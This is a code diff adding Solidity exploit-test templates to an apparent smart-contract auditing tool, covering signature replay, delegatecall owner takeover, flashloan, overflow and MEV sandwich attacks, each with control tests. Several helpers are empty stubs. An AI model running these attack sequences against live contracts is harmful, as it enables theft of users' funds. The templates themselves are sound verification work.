@@ -473,6 +473,397 @@ ${REENTERER}`,
       };
     }
 
+    case 'sol.signature': {
+      const t = `test_sigreplay_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'a permit / meta-transaction entrypoint taking (v, r, s)',
+          'one fixed authorization that can be submitted twice',
+        ],
+        claim: {
+          kind: 'unauthorized_access',
+          description: 'one signature is accepted more than once, so a single authorization is spent twice',
+        },
+        // The measured quantity is deliberately narrow: how many times the FIRST
+        // signature was accepted. Counting any acceptance would let a legitimate
+        // second (distinct) signature look like a replay.
+        solidity: `${head}
+    /// One fixed digest, signed by a key the attacker holds. vm.sign is used
+    /// rather than hardcoded bytes so the test cannot silently become a
+    /// signature over the wrong digest.
+    function _signedDigest() internal view returns (bytes32) {
+        return keccak256(abi.encode(address(target), block.chainid, "CHANGE_ME replayable payload"));
+    }
+
+    function ${t}() public {
+        bytes32 digest = _signedDigest();
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0xA11CE, digest);
+        bytes memory sig = abi.encode(v, r, s);
+
+        vm.startPrank(attacker);
+        (bool first, ) = address(target).call(abi.encodeWithSignature("CHANGE_ME(bytes)", sig));
+        (bool second, ) = address(target).call(abi.encodeWithSignature("CHANGE_ME(bytes)", sig));
+        vm.stopPrank();
+
+        // Acceptances of THAT ONE signature. 1 or 0 is correct; 2 is a replay.
+        uint256 reused = (first ? uint256(1) : uint256(0)) + (second ? uint256(1) : uint256(0));
+        _impact(0, reused, ${solString('acceptances of one fixed signature (2 = the same authorization was spent twice)')});
+
+        // Bug present => the identical signature is accepted twice.
+        assertLe(reused, 1, "SIGNATURE: one signature was accepted twice");
+    }
+
+    function ${t}_control() public {
+        bytes32 digest = _signedDigest();
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0xA11CE, digest);
+        vm.startPrank(attacker);
+        (bool ok, ) = address(target).call(abi.encodeWithSignature("CHANGE_ME(bytes)", abi.encode(v, r, s)));
+        vm.stopPrank();
+        // The fixture must be able to submit a valid signature at all, or the
+        // replay above proves nothing.
+        assertTrue(ok, "CONTROL: a valid signature is rejected; the fixture is broken");
+    }
+
+    /// Enabling precondition removed: the second submission carries a DIFFERENT
+    /// signature (a distinct digest), so nothing is reused. The measurement is
+    /// unchanged and must now be 1, which shows reuse was the cause.
+    function ${t}_nocond() public {
+        bytes32 digest = _signedDigest();
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0xA11CE, digest);
+        bytes memory firstSig = abi.encode(v, r, s);
+
+        bytes32 other = keccak256(abi.encode(digest, "second, distinct authorization"));
+        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(0xA11CE, other);
+
+        vm.startPrank(attacker);
+        (bool first, ) = address(target).call(abi.encodeWithSignature("CHANGE_ME(bytes)", firstSig));
+        address(target).call(abi.encodeWithSignature("CHANGE_ME(bytes)", abi.encode(v2, r2, s2)));
+        vm.stopPrank();
+        // Silence the unused-variable warning forge would print.
+        first;
+        v; r; s;
+
+        uint256 reused = first ? uint256(1) : uint256(0);
+        _impact(0, reused, ${solString('acceptances of the first signature when the second submission is a distinct signature')});
+        assertLe(reused, 1, "NOCOND: the same signature was accepted twice without being reused, so reuse was not the cause");
+    }
+}`,
+      };
+    }
+
+    case 'sol.delegatecall': {
+      const t = `test_delegatecall_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'a delegatecall whose target or calldata is caller-supplied',
+        ],
+        claim: {
+          kind: 'state_corruption',
+          description: 'an attacker-controlled delegatecall overwrites a privileged storage slot in the caller',
+        },
+        solidity: `${head}
+    function ${t}() public {
+        address ownerBefore = target.owner();
+        require(ownerBefore != attacker, "attacker already owns the target");
+
+        // A callee that writes the caller storage slot 0. Under delegatecall it
+        // runs in the TARGET storage, so this is a write to the owner slot.
+        SlotWriter writer = new SlotWriter();
+        vm.startPrank(attacker);
+        (bool ok, ) = address(target).call(
+            abi.encodeWithSignature("CHANGE_ME(address,bytes)", address(writer), abi.encode(uint256(uint160(attacker))))
+        );
+        vm.stopPrank();
+        console2.log("forwarded", ok);
+
+        address ownerAfter = target.owner();
+        // Measured: 0 = owner slot intact, 1 = the attacker now owns it.
+        uint256 hijacked = ownerAfter == attacker ? uint256(1) : uint256(0);
+        _impact(0, hijacked, ${solString('whether the privileged owner slot was overwritten through delegatecall (1 = hijacked)')});
+
+        // Bug present => the attacker became the owner.
+        assertEq(hijacked, 0, "DELEGATECALL: attacker-controlled delegatecall overwrote the owner slot");
+    }
+
+    function ${t}_control() public {
+        address ownerBefore = target.owner();
+        // A delegatecall that still happens but writes an UNRELATED slot, so the
+        // plumbing is exercised while nothing privileged is touched.
+        SlotWriter writer = new SlotWriter();
+        vm.startPrank(attacker);
+        (bool ok, ) = address(target).call(
+            abi.encodeWithSignature("CHANGE_ME(address,bytes)", address(writer), abi.encode(uint256(0)))
+        );
+        vm.stopPrank();
+        require(ok, "control delegatecall did not go through");
+        assertEq(target.owner(), ownerBefore, "CONTROL: the owner slot moved without any privileged write");
+    }
+
+    /// Enabling precondition removed: the delegatecall target is NOT
+    /// attacker-supplied. The same measurement must stay 0, which shows the
+    /// controllability was the cause and not delegatecall itself.
+    function ${t}_nocond() public {
+        vm.startPrank(attacker);
+        address(target).call(
+            abi.encodeWithSignature("CHANGE_ME(address,bytes)", address(this), abi.encode(uint256(0)))
+        );
+        vm.stopPrank();
+        uint256 hijacked = target.owner() == attacker ? uint256(1) : uint256(0);
+        _impact(0, hijacked, ${solString('whether the owner slot was overwritten when the delegatecall target was not attacker-supplied')});
+        assertEq(hijacked, 0, "NOCOND: the owner slot was overwritten without an attacker-supplied target, so controllability was not the cause");
+    }
+}
+
+/// Writes the caller storage slot 0 when reached via delegatecall.
+contract SlotWriter {
+    function pwn(uint256 v) external {
+        assembly { sstore(0, v) }
+    }
+}`,
+      };
+    }
+
+    case 'sol.flashloan': {
+      const t = `test_flashloan_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'a lender reachable on the fork, and an invariant the loan can break',
+        ],
+        claim: {
+          kind: 'value_transfer',
+          description: 'an amplified sequence with zero capital leaves the attacker holding more than it started with',
+        },
+        solidity: `${head}
+    /// The attacker starts with NO capital: that is the whole claim. Starting
+    /// funded would let an ordinary profitable trade look like an exploit.
+    function ${t}() public {
+        vm.deal(attacker, 0);
+        uint256 before_ = attacker.balance;
+        require(before_ == 0, "fixture: attacker must start with zero capital");
+
+        vm.startPrank(attacker);
+        // Borrow, break the invariant with borrowed size, repay, keep the rest.
+        uint256 borrowed = takeFlashloan(50000 ether);
+        amplify(borrowed);
+        repayFlashloan(borrowed);
+        vm.stopPrank();
+
+        uint256 after_ = attacker.balance;
+        console2.log("borrowed", borrowed);
+        _impact(before_, after_, ${solString('attacker cash before and after a zero-capital flashloan-amplified sequence')});
+
+        // int256 so a loss (the normal case) does not underflow into a panic
+        // that looks like the assertion we are looking for.
+        int256 delta = int256(after_) - int256(before_);
+        console2.log(string.concat("delta=", vm.toString(delta)));
+        assertLe(delta, int256(0), "FLASHLOAN: zero-capital sequence ended with the attacker in profit");
+    }
+
+    function ${t}_control() public {
+        vm.deal(attacker, 0);
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        // Borrow and repay with no amplification: the loan must be free.
+        uint256 borrowed = takeFlashloan(50000 ether);
+        repayFlashloan(borrowed);
+        vm.stopPrank();
+        assertEq(attacker.balance, before_, "CONTROL: a bare borrow/repay round trip changed the balance");
+    }
+
+    /// Enabling precondition removed: no loan is taken, so the amplification is
+    /// funded by the attacker own (zero) capital and cannot be sized to move the
+    /// invariant. Same measurement, same assertion.
+    function ${t}_nocond() public {
+        vm.deal(attacker, 0);
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        amplify(0);
+        vm.stopPrank();
+        uint256 after_ = attacker.balance;
+        int256 delta = int256(after_) - int256(before_);
+        _impact(before_, after_, ${solString('attacker cash before and after the same sequence with no borrowed capital')});
+        assertLe(delta, int256(0), "NOCOND: the sequence profited without borrowed capital, so the loan was not the cause");
+    }
+
+    function takeFlashloan(uint256) internal returns (uint256) { return 0; }
+    function repayFlashloan(uint256) internal {}
+    function amplify(uint256) internal {}
+}`,
+      };
+    }
+
+    case 'sol.overflow': {
+      const t = `test_overflow_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'an unchecked block or a narrowing downcast on a balance or share computation',
+        ],
+        claim: {
+          kind: 'value_transfer',
+          description: 'wrapped arithmetic credits the caller more than it supplied',
+        },
+        solidity: `${head}
+    function ${t}() public {
+        uint256 before_ = attacker.balance;
+
+        vm.startPrank(attacker);
+        (bool deposited, ) = address(target).call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
+        require(deposited, "fixture: deposit failed, so there is no position to overflow");
+
+        // Maximum-width argument. An unchecked subtraction, or a downcast to
+        // uint128/uint64 that truncates before the check, wraps here.
+        (bool ok, ) = address(target).call(
+            abi.encodeWithSignature("withdraw(uint256)", type(uint256).max)
+        );
+        vm.stopPrank();
+        console2.log("withdraw max succeeded", ok);
+
+        uint256 after_ = attacker.balance;
+        _impact(before_, after_, ${solString('attacker balance before depositing and after a max-width withdraw (a wrapped credit exceeds the deposit)')});
+
+        // At most the deposit comes back, so the balance must never exceed where
+        // it started: a correct contract returns the deposit exactly.
+        assertLe(after_, before_, "OVERFLOW: wrapped arithmetic credited more than was deposited");
+    }
+
+    function ${t}_control() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        (bool deposited, ) = address(target).call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
+        require(deposited, "CONTROL: deposit does not work at all");
+        (bool withdrew, ) = address(target).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
+        vm.stopPrank();
+        assertTrue(withdrew, "CONTROL: a plain deposit/withdraw round trip fails; the fixture is broken");
+        assertLe(attacker.balance, before_, "CONTROL: an exact round trip already credited value");
+    }
+
+    /// Enabling precondition removed: no max-width argument is supplied, so no
+    /// wrapping input reaches the arithmetic. Same measurement, same ceiling.
+    function ${t}_nocond() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        (bool deposited, ) = address(target).call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
+        if (deposited) {
+            address(target).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
+        }
+        vm.stopPrank();
+
+        _impact(before_, attacker.balance, ${solString('attacker balance before depositing and after a bounded withdraw')});
+        assertLe(attacker.balance, before_, "NOCOND: value was credited without a max-width argument, so wrapping was not the cause");
+    }
+}`,
+      };
+    }
+
+    case 'sol.mev': {
+      const t = `test_mev_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'a pool whose price a victim transaction consumes',
+          'a mempool position the harness can occupy explicitly',
+        ],
+        claim: {
+          kind: 'value_transfer',
+          description: 'a sandwich around a victim swap degrades the price the victim executes at',
+        },
+        solidity: `${head}
+    uint256 constant VICTIM_IN = 10 ether;
+
+    function ${t}() public {
+        // The price the victim WOULD have received with no interference,
+        // measured on the same fork state before anything moves it.
+        uint256 fair = quoteOut(address(target), VICTIM_IN);
+        require(fair > 0, "fixture: the pool quotes zero, so there is nothing to sandwich");
+
+        vm.deal(attacker, 1000 ether);
+
+        // 1. front-run: the attacker buys, moving the price against the victim.
+        vm.startPrank(attacker);
+        swapExactIn(address(target), 500 ether);
+        vm.stopPrank();
+
+        // 2. the victim transaction executes inside the moved price.
+        vm.deal(victim, VICTIM_IN);
+        vm.startPrank(victim);
+        uint256 got = swapExactIn(address(target), VICTIM_IN);
+        vm.stopPrank();
+
+        // 3. back-run: the attacker sells into the victim own price impact.
+        vm.startPrank(attacker);
+        swapExactIn(address(target), 0);
+        vm.stopPrank();
+
+        // The claim as a measured number: how many basis points of the fair
+        // output the victim lost. 0 is clean, 100 is the 1% bound.
+        uint256 lossBps = fair == 0 ? uint256(0) : ((fair > got ? fair - got : uint256(0)) * 10000) / fair;
+        _impact(0, lossBps, ${solString('basis points of the fair output the victim lost to a sandwich (100 bps = 1%)')});
+
+        // Bug present => the victim lost more than 1% to the sandwich.
+        assertLe(lossBps, 100, "MEV: a sandwich degraded the victim execution price by more than 1%");
+    }
+
+    function ${t}_control() public {
+        uint256 fair = quoteOut(address(target), VICTIM_IN);
+        vm.deal(victim, VICTIM_IN);
+        vm.startPrank(victim);
+        uint256 got = swapExactIn(address(target), VICTIM_IN);
+        vm.stopPrank();
+        // Unsandwiched, execution must match the quote closely, or the quote and
+        // the swap are measuring different things and the attack means nothing.
+        uint256 lossBps = fair == 0 ? uint256(0) : ((fair > got ? fair - got : uint256(0)) * 10000) / fair;
+        assertLe(lossBps, 100, "CONTROL: an unsandwiched swap already misses its own quote");
+    }
+
+    /// Enabling precondition removed: the attacker does not front-run, so the
+    /// victim executes against untouched state. Same measurement, same bound.
+    function ${t}_nocond() public {
+        uint256 fair = quoteOut(address(target), VICTIM_IN);
+        vm.deal(victim, VICTIM_IN);
+        vm.startPrank(victim);
+        uint256 got = swapExactIn(address(target), VICTIM_IN);
+        vm.stopPrank();
+
+        uint256 lossBps = fair == 0 ? uint256(0) : ((fair > got ? fair - got : uint256(0)) * 10000) / fair;
+        _impact(0, lossBps, ${solString('basis points the victim lost with no front-run at all')});
+        assertLe(lossBps, 100, "NOCOND: the victim lost value with no front-run, so the sandwich was not the cause");
+    }
+
+    function swapExactIn(address, uint256 amountIn) internal returns (uint256) { return amountIn; }
+    function quoteOut(address, uint256) internal view returns (uint256) { return 0; }
+}`,
+      };
+    }
+
     default:
       // No honest harness for this class yet. Saying so is the correct answer.
       return null;
@@ -501,4 +892,48 @@ export const HARNESSED = new Set([
   'sol.rounding',
   'sol.inflation',
   'sol.dos',
+  'sol.signature',
+  'sol.delegatecall',
+  'sol.flashloan',
 ]);
+
+/**
+ * Harnesses that exist and work but whose CLASS is not in the playbook catalog.
+ *
+ * `sol.overflow` and `sol.mev` were specified as part of the harness work, and
+ * both are implemented above exactly like the rest (attack + control + nocond,
+ * measured delta, honest precondition removal). But neither has a `PLAYBOOKS`
+ * row and neither has a class in `corpus-digest.json`, and this project's rule is
+ * that a capability is added by adding a playbook — nothing else — so a harness
+ * for an id nothing routes to would be unreachable code pretending to be
+ * coverage.
+ *
+ * They are therefore NOT in `HARNESSED`:
+ *
+ *   · `HARNESSED` answers "does this class have a harness", and both `rank()`
+ *     and the dispatch coverage invariant consume it. Listing a class that does
+ *     not exist would make `rank()` claim a harness for a playbook the operator
+ *     cannot select.
+ *   · `dispatchable ⊆ HARNESSED` (asserted in tests/dispatch-coverage.test.mjs)
+ *     is unaffected: a class that is not a playbook cannot be dispatchable.
+ *
+ * The harnesses stay, and a test asserts they synthesize, so promoting either
+ * class later is a playbook row plus a corpus class — not a rewrite.
+ */
+export const UNPLAYBOOKED_HARNESSES = new Set(['sol.overflow', 'sol.mev']);
+
+/**
+ * True when this class has a real attack+control harness pair above.
+ *
+ * Exported as a predicate so callers do not reach into the Set and so the
+ * invariant "dispatchable is a subset of HARNESSED" can be asserted once in a
+ * test instead of being re-derived at each call site.
+ */
+export function hasHarness(playbookId: string): boolean {
+  return HARNESSED.has(playbookId);
+}
+
+/** True when a harness is implemented for this id, playbook or not. */
+export function synthesizable(playbookId: string): boolean {
+  return HARNESSED.has(playbookId) || UNPLAYBOOKED_HARNESSES.has(playbookId);
+}
